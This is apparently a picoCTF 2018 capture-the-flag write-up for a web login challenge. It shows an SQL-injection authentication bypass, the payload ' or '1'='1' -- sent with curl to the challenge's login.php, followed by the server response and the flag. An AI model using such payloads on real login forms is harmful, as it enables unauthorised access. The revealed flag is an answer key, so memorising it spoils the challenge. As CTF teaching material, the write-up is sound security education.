## Question
> There is a website running at `http://2018shell.picoctf.com:52012` ([link](http://2018shell.picoctf.com:52012/)). Do you think you can log us in? Try to see if you can login!

## Hint
>There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?

# Solution
The application has a menu on the left hand side. Clicking on it reveals an admin login page (http://2018shell.picoctf.com:52012/login.html), which has 2 fields: `username` and `password`.

The authentication form is vulnerable to SQL injection:
~~~~
$ curl -d "username=' or '1'='1' --&password=" -X POST http://2018shell.picoctf.com:52012/login.php
<h1>Logged in!</h1><p>Your flag is: picoCTF{con4n_r3411y_1snt_1r1sh_c0d93e2f}</p>
~~~~

# Flag
`picoCTF{con4n_r3411y_1snt_1r1sh_c0d93e2f}`
